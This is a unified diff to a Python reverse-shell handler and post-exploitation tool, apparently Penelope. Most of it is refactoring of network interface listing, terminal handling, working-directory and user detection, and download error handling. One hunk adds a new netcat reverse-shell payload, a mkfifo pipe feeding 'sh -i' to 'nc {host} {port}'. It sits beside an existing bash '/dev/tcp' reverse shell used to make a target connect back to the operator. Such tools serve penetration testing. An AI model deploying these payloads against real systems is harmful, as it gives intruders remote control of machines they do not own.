@@ -73,7 +73,7 @@ normalize_path = lambda path: os.path.normpath(os.path.expandvars(os.path.expand
 
 def ask(text):
 	try:
-		return input(f"{paint(f'[?] {text}: ').yellow}")
+		return original_input(f"{paint(f'[?] {text}: ').yellow}")
 	except EOFError:
 		return ask(text)
 
@@ -132,33 +132,43 @@ class Interfaces:
 		else:
 			return interface_name
 
+	@staticmethod
+	def ipa(busybox=False):
+		interfaces = []
+		current_interface = None
+		params = ['ip', 'addr']
+		if busybox:
+			params.insert(0, 'busybox')
+		for line in subprocess.check_output(params).decode().splitlines():
+			interface = re.search(r"^\d+: (.+?):", line)
+			if interface:
+				current_interface = interface[1]
+				continue
+			if current_interface:
+				ip = re.search(r"inet (\d+\.\d+\.\d+\.\d+)", line)
+				if ip:
+					interfaces.append((current_interface, ip[1]))
+					current_interface = None # TODO support multiple IPs in one interface
+		return interfaces
+
+	@staticmethod
+	def ifconfig():
+		output = subprocess.check_output(['ifconfig']).decode()
+		return re.findall(r'^(\w+).*?\n\s+inet (?:addr:)?(\d+\.\d+\.\d+\.\d+)', output, re.MULTILINE | re.DOTALL)
+
 	@property
 	def list(self):
-		if OS == 'Linux':
-			if shutil.which("ip"):
-				interfaces = []
-				current_interface = None
-				for line in subprocess.check_output(['ip', 'addr']).decode().splitlines():
-					interface = re.search(r"^\d+: (.+?):", line)
-					if interface:
-						current_interface = interface[1]
-						continue
-					if current_interface:
-						ip = re.search(r"inet (\d+\.\d+\.\d+\.\d+)", line)
-						if ip:
-							interfaces.append((current_interface, ip[1]))
-							current_interface = None # TODO support multiple IPs in one interface
-			else:
-				logger.error("'ip' command is not available")
-				return dict()
+		if shutil.which("ip"):
+			interfaces = self.ipa()
 
-		elif OS == 'Darwin':
-			if shutil.which("ifconfig"):
-				output = subprocess.check_output(['ifconfig']).decode()
-				interfaces = re.findall(r'^(\w+).*?\n\s+inet (?:addr:)?(\d+\.\d+\.\d+\.\d+)', output, re.MULTILINE | re.DOTALL)
-			else:
-				logger.error("'ifconfig' command is not available")
-				return dict()
+		elif shutil.which("ifconfig"):
+			interfaces = self.ifconfig()
+
+		elif shutil.which("busybox"):
+			interfaces = self.ipa(busybox=True)
+		else:
+			logger.error("'ip', 'ifconfig' and 'busybox' commands are not available. (Really???)")
+			return dict()
 
 		return {i[0]:i[1] for i in interfaces}
 
@@ -420,15 +430,13 @@ class CustomFormatter(logging.Formatter):
 		if record.levelno is logging.DEBUG or options.debug:
 			thread = paint(" ") + paint(threading.current_thread().name).white_CYAN
 
-		prefix = "\r"
+		prefix = "\x1b[2K\r"
 		suffix = "\r\n"
 
 		if core.wait_input:
-			prefix += "\x1b[2K"
 			suffix += bytes(core.output_line_buffer).decode() + readline.get_line_buffer()
 
 		elif core.attached_session:
-			prefix += "\x1b[2K"
 			suffix += bytes(core.output_line_buffer).decode()
 
 		text = f"{prefix}{template['prefix']}{thread} {logging.Formatter.format(self, record)}{suffix}"
@@ -1731,7 +1739,7 @@ def handle_bind_errors(func):
 			elif e.errno == EADDRNOTAVAIL:
 				logger.error("Cannot listen on the requested address")
 			else:
-				logger.error(f"OS error: {str(e)}")
+				logger.error(f"OSError: {str(e)}")
 
 		except OverflowError:
 			logger.error("Invalid port number. Valid numbers: 1-65535")
@@ -2137,25 +2145,13 @@ class Session:
 		if self._tty is None:
 			try:
 				self.bypass_control_session = True
-				self._tty = self.exec(f"readlink -f /proc/{self.shell_pid}/fd/0", value=True) # TODO check binary
+				self._tty = self.exec(f"tty", value=True) # TODO check binary
 				self.bypass_control_session = False
-				if not self._tty.startswith("/dev/pts/"):
+				if not "/" in self._tty:
 					self._tty = None
 			except:
 				pass
 		return self._tty
-
-	@property
-	def bsd(self):
-		if self._bsd is None:
-			self._bsd = False
-			if self.OS == 'Unix':
-				try:
-					response = self.control_session.exec("uname -s", value=True)
-					self._bsd = bool(re.search(r"(BSD|Darwin)", response))
-				except:
-					pass
-		return self._bsd
 
 	@property
 	def cwd(self):
@@ -2163,19 +2159,13 @@ class Session:
 			if self.OS == 'Unix':
 				if not self.shell_pid: #TEMP
 					self.get_shell_pid()
-				if self.bsd:
-					self._cwd = self.control_session.exec(f"lsof -a -p {self.shell_pid} -d cwd -Fn 2>/dev/null | grep '^n' | cut -c2-", value=True)
-				elif self.agent:
-					self._cwd = self.exec(
-					f"""
-					try:
-						cwd = os.readlink('/proc/{self.shell_pid}/cwd')
-					except:
-						cwd = ''
-					stdout_stream << str(cwd).encode()
-					""", python=True, value=True)
-				else:
-					self._cwd = self.control_session.exec(f"readlink -f /proc/{self.shell_pid}/cwd", value=True)
+				cmd = (
+				    f"readlink /proc/{self.shell_pid}/cwd 2>/dev/null || "
+				    f"lsof -p {self.shell_pid} 2>/dev/null | awk '$4==\"cwd\" {{print $NF;exit}}' | grep . || "
+				    f"procstat -f {self.shell_pid} 2>/dev/null | awk '$3==\"cwd\" {{print $NF;exit}}' | grep . || "
+				    f"pwdx {self.shell_pid} 2>/dev/null | awk '{{print $2;exit}}' | grep ."
+				)
+				self._cwd = self.control_session.exec(cmd, value=True)
 			elif self.OS == 'Windows':
 				self._cwd = self.exec("cd", force_cmd=True, value=True)
 		return self._cwd
@@ -2184,21 +2174,12 @@ class Session:
 	def user(self):
 		if self._user is None:
 			if self.OS == 'Unix':
-				if self.bsd:
-					self._user = self.control_session.exec(f"ps -o user= -p {self.shell_pid}", value=True)
-				elif self.agent:
+				if self.agent:
 					self._user = self.exec(
 					"""
-					file = open("/proc/" + str(shell_pid) + "/status", "r")
-					for line in file:
-						if line.startswith("Uid:"):
-							uid = int(line.split()[1])
-							from pwd import getpwuid
-							stdout_stream << getpwuid(uid).pw_name.encode()
-					file.close()
+					from getpass import getuser
+					stdout_stream << getuser().encode()
 					""", python=True, value=True)
-					if not self._user:
-						self._user = False
 				else:
 					self._user = self.control_session.exec(
 					f"cat /proc/{self.shell_pid}/status|awk '/Uid:/ {{print $2}}'|xargs -I{{}} getent passwd {{}}|cut -d: -f1",
@@ -2225,7 +2206,7 @@ class Session:
 					binaries = [
 						"sh", "bash", "python", "python3",
 						"script", "socat", "tty", "echo", "base64", "wget",
-						"curl", "tar", "rm", "stty", "setsid", "find"
+						"curl", "tar", "rm", "stty", "setsid", "find", "nc"
 					]
 					response = self.exec(f'for i in {" ".join(binaries)}; do which $i 2>/dev/null || echo;done')
 					if response:
@@ -3016,7 +2997,7 @@ class Session:
 			available_bytes = shutil.disk_usage(local_download_folder).free
 			if self.agent:
 				block_size = os.statvfs(local_download_folder).f_frsize
-				response = self.exec(f"{inspect.getsource(get_glob_size)}"
+				response = self.exec(f"{GET_GLOB_SIZE}"
 					f"stdout_stream << str(get_glob_size({repr(remote_items)}, {block_size})).encode()", python=True, value=True)
 				try:
 					remote_size = int(float(response))
@@ -3316,7 +3297,7 @@ class Session:
 				remote_available_blocks, remote_block_size = map(int, response.split(';'))
 				remote_space = remote_available_blocks * remote_block_size
 			else:
-				remote_block_size = int(self.exec(rf"stat {destination}| sed -n 's/.*IO Block: \([0-9]*\).*/\1/p'", value=True))
+				remote_block_size = int(self.exec(rf'stat -c "%o" {destination} 2>/dev/null || stat -f "%k" {destination}', value=True))
 				remote_space = int(self.exec(f"df -k {destination}|tail -1|awk '{{print $4}}'", value=True)) * 1024
 
 			# Calculate local size
@@ -3581,6 +3562,8 @@ class Session:
 
 				if self.bin['bash']:
 					cmd = f'echo -n "{self.bin["setsid"]} {self.bin["bash"]} >& /dev/tcp/{host}/{port} 0>&1 &"|{self.bin["bash"]}'
+				elif self.bin['nc']:
+					cmd = f'daemon sh -c \'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | {self.bin["sh"]} -i 2>&1 | nc {host} {port} > /tmp/f\''
 
 				elif self.bin['sh']:
 					ncat_cmd = f'{self.bin["sh"]} -c "{self.bin["setsid"]} {{}} -e {self.bin["sh"]} {host} {port} &"'
@@ -4496,11 +4479,16 @@ def url_to_bytes(URL):
 	data = bytearray()
 	pbar = PBar(size, caption=f" {paint('⤷').cyan} ", barlen=40, metric=Size)
 	while True:
-		chunk = response.read(options.network_buffer_size)
-		if not chunk:
+		try:
+			chunk = response.read(options.network_buffer_size)
+			if not chunk:
+				break
+			data.extend(chunk)
+			pbar.update(len(chunk))
+		except Exception as e:
+			logger.error(e)
+			pbar.terminate()
 			break
-		data.extend(chunk)
-		pbar.update(len(chunk))
 
 	return filename, data
 
@@ -4545,10 +4533,10 @@ def listener_menu():
 		)
 
 		r, _, _ = select([sys.stdin, listener_menu.control_r], [], [])
-		termios.tcsetattr(sys.stdin, termios.TCSADRAIN, TTY_NORMAL)
 
 		if sys.stdin in r:
 			command = sys.stdin.read(1).lower()
+			termios.tcsetattr(sys.stdin, termios.TCSADRAIN, TTY_NORMAL)
 			if command == 'p':
 				print()
 				for listener in core.listeners.values():
@@ -4862,6 +4850,7 @@ URLS = {
 }
 
 # Python Agent code
+GET_GLOB_SIZE = inspect.getsource(get_glob_size)
 MESSENGER = inspect.getsource(Messenger)
 STREAM = inspect.getsource(Stream)
 AGENT = inspect.getsource(agent)
